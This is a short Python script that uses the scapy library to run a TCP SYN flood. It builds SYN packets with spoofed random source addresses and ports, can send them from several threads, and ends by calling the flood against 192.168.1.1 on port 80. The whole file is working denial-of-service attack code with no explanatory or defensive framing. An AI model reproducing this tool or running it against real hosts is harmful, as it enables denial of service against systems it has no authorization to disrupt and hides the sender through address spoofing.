# -*- coding: utf-8 -*-
from scapy.all import *
import threading
import random

def gen_syn(total,dst_ip,port):
    for i in range(total):
        random_ip = '10.' + '200.' + '101.' + str(random.randrange(0, 255))
        random_sPort = random.randrange(10000, 65535)
        ip = IP(src=random_ip, dst=dst_ip)
        tcp = TCP(sport=random_sPort, dport=port, flags='S', seq=11111)
        pkt = (ip / tcp)
        pkt=IP(raw(pkt))
        yield pkt


def send_pkt(pkt_num,dst_ip,port):
    for pkt in gen_syn(pkt_num,dst_ip,port):
        send(pkt)



def syn_flood(thread_num,total,dst_ip,port):
    if thread_num==0:
        send_pkt(total,dst_ip,port)
    else:
        name=[]
        pkt_num = int(total / thread_num)
        for i in range(thread_num):
            t = threading.Thread(target=send_pkt, args=(pkt_num, dst_ip, port))
            t.start()
            name.append(t)
        for i in range(thread_num):
            name[i].join()


syn_flood(0,2,'192.168.1.1',80)
